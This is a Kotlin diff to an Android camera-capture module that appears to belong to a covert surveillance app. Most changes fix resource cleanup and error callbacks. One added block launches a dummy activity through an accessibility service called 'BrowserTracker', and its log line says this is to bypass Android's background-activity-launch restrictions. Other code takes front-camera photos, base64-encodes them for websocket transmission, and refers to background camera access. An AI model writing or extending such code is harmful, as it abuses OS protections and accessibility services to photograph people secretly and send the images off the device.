@@ -24,6 +24,29 @@ object CameraCapture {
     private const val TAG = "CameraCapture"
     var activeDummyCallback: ((String?, String?) -> Unit)? = null
 
+    private var activeCameraDevice: CameraDevice? = null
+    private var activeCaptureSession: CameraCaptureSession? = null
+    private var activeImageReader: ImageReader? = null
+
+    @Synchronized
+    fun forceReleaseCamera() {
+        try {
+            activeCaptureSession?.close()
+        } catch (_: Exception) {}
+        activeCaptureSession = null
+
+        try {
+            activeCameraDevice?.close()
+        } catch (_: Exception) {}
+        activeCameraDevice = null
+
+        try {
+            activeImageReader?.close()
+        } catch (_: Exception) {}
+        activeImageReader = null
+        Log.i(TAG, "🧹 Camera hardware resources fully released/closed")
+    }
+
     fun takePhoto(context: Context, cameraType: String = "front", callback: (String?, String?) -> Unit) {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "❌ CAMERA permission not granted on device")
@@ -42,7 +65,12 @@ object CameraCapture {
                         putExtra("cameraType", cameraType)
                         addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     }
-                    context.startActivity(intent)
+                    if (BrowserTracker.instance != null) {
+                        Log.i(TAG, "Launching CameraDummyActivity from AccessibilityService to bypass BAL restrictions...")
+                        BrowserTracker.instance!!.startActivity(intent)
+                    } else {
+                        context.startActivity(intent)
+                    }
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to launch CameraDummyActivity: ${e.message}")
                     callback(null, "Camera capture failed: ${errorReason ?: e.message}")
@@ -70,15 +98,25 @@ object CameraCapture {
             return
         }
 
+        forceReleaseCamera()
+
         val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val handler = Handler(Looper.getMainLooper())
         var cameraClosed = false
 
+        fun cleanup() {
+            if (!cameraClosed) {
+                cameraClosed = true
+                handler.removeCallbacksAndMessages(null)
+            }
+            forceReleaseCamera()
+        }
+
         // Timeout fallback after 6 seconds to prevent leaking resources
         val timeoutRunnable = Runnable {
             if (!cameraClosed) {
-                cameraClosed = true
                 Log.e(TAG, "⏱️ Camera capture timed out after 6 seconds")
+                cleanup()
                 callback(null, "Camera capture timed out (device screen might be sleeping or camera busy)")
             }
         }
@@ -108,7 +146,7 @@ object CameraCapture {
 
             if (targetCameraId == null) {
                 Log.e(TAG, "No camera found on device")
-                handler.removeCallbacks(timeoutRunnable)
+                cleanup()
                 callback(null, "No $cameraType camera hardware found on this device")
                 return
             }
@@ -118,39 +156,22 @@ object CameraCapture {
             val chars = cameraManager.getCameraCharacteristics(targetCameraId)
             val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
 
-            // Choose resolution up to ~1280x720 for fast websocket transmission
+            // Choose exact supported resolution up to ~1280x720 for fast websocket transmission
             val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: arrayOf()
             var width = 640
             var height = 480
-            for (size in sizes) {
-                if (size.width in 640..1280 && size.height in 480..960) {
-                    width = size.width
-                    height = size.height
-                    break
-                }
+            if (sizes.isNotEmpty()) {
+                val bestSize = sizes.firstOrNull { it.width in 640..1280 && it.height in 480..960 }
+                    ?: sizes.minByOrNull { it.width * it.height }
+                    ?: sizes[0]
+                width = bestSize.width
+                height = bestSize.height
+                Log.i(TAG, "Selected exact camera output size: ${width}x${height}")
             }
 
             val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
-
-            var openedCamera: CameraDevice? = null
-            var activeSession: CameraCaptureSession? = null
-
-            fun cleanup() {
-                if (!cameraClosed) {
-                    cameraClosed = true
-                    handler.removeCallbacks(timeoutRunnable)
-                }
-                try {
-                    activeSession?.close()
-                } catch (_: Exception) {}
-                try {
-                    openedCamera?.close()
-                } catch (_: Exception) {}
-                try {
-                    imageReader.close()
-                } catch (_: Exception) {}
-            }
+            activeImageReader = imageReader
 
             imageReader.setOnImageAvailableListener({ reader ->
                 try {
@@ -163,56 +184,86 @@ object CameraCapture {
 
                         val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                         Log.i(TAG, "✅ Camera photo captured (${bytes.size} bytes)")
+                        val wasClosed = cameraClosed
                         cleanup()
-                        if (cameraClosed) {
+                        if (!wasClosed) {
                             callback(base64, null)
                         }
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error processing image bytes: ${e.message}", e)
+                    val wasClosed = cameraClosed
                     cleanup()
-                    callback(null, "Failed to read camera image bytes: ${e.message}")
+                    if (!wasClosed) {
+                        callback(null, "Failed to read camera image bytes: ${e.message}")
+                    }
                 }
             }, handler)
 
             cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
-                    openedCamera = camera
+                    activeCameraDevice = camera
                     try {
                         camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(session: CameraCaptureSession) {
-                                activeSession = session
+                                activeCaptureSession = session
                                 try {
                                     val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                     builder.addTarget(imageReader.surface)
-                                    builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                    val afModes = chars.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES)
+                                    if (afModes != null && afModes.contains(CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)) {
+                                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                    } else {
+                                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
+                                    }
                                     builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
 
-                                    session.capture(builder.build(), null, handler)
+                                    session.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {
+                                        override fun onCaptureFailed(session: CameraCaptureSession, request: CaptureRequest, failure: CaptureFailure) {
+                                            Log.e(TAG, "Still capture failed: ${failure.reason}")
+                                            val wasClosed = cameraClosed
+                                            cleanup()
+                                            if (!wasClosed) {
+                                                callback(null, "Camera still capture failed (reason: ${failure.reason})")
+                                            }
+                                        }
+                                    }, handler)
                                 } catch (e: Exception) {
                                     Log.e(TAG, "Error starting capture: ${e.message}")
+                                    val wasClosed = cameraClosed
                                     cleanup()
-                                    callback(null, "Error starting capture request: ${e.message}")
+                                    if (!wasClosed) {
+                                        callback(null, "Error starting capture request: ${e.message}")
+                                    }
                                 }
                             }
 
                             override fun onConfigureFailed(session: CameraCaptureSession) {
                                 Log.e(TAG, "Camera session configuration failed")
+                                val wasClosed = cameraClosed
                                 cleanup()
-                                callback(null, "Camera capture session configuration failed")
+                                if (!wasClosed) {
+                                    callback(null, "Camera capture session configuration failed")
+                                }
                             }
                         }, handler)
                     } catch (e: Exception) {
                         Log.e(TAG, "Error creating capture session: ${e.message}")
+                        val wasClosed = cameraClosed
                         cleanup()
-                        callback(null, "Error creating capture session: ${e.message}")
+                        if (!wasClosed) {
+                            callback(null, "Error creating capture session: ${e.message}")
+                        }
                     }
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
                     Log.w(TAG, "Camera disconnected")
+                    val wasClosed = cameraClosed
                     cleanup()
-                    callback(null, "Camera hardware disconnected or in use by another app")
+                    if (!wasClosed) {
+                        callback(null, "Camera hardware disconnected or in use by another app")
+                    }
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
@@ -225,19 +276,28 @@ object CameraCapture {
                         else -> "Camera error code $error"
                     }
                     Log.e(TAG, "Camera error: $errText ($error)")
+                    val wasClosed = cameraClosed
                     cleanup()
-                    callback(null, errText)
+                    if (!wasClosed) {
+                        callback(null, errText)
+                    }
                 }
             }, handler)
 
         } catch (e: SecurityException) {
             Log.e(TAG, "SecurityException opening camera: ${e.message}")
-            handler.removeCallbacks(timeoutRunnable)
-            callback(null, "SecurityException: Background camera access blocked by OS (${e.message})")
+            val wasClosed = cameraClosed
+            cleanup()
+            if (!wasClosed) {
+                callback(null, "SecurityException: Background camera access blocked by OS (${e.message})")
+            }
         } catch (e: Exception) {
             Log.e(TAG, "Exception in takePhotoDirect: ${e.message}", e)
-            handler.removeCallbacks(timeoutRunnable)
-            callback(null, "Exception opening camera: ${e.message}")
+            val wasClosed = cameraClosed
+            cleanup()
+            if (!wasClosed) {
+                callback(null, "Exception opening camera: ${e.message}")
+            }
         }
     }
 }
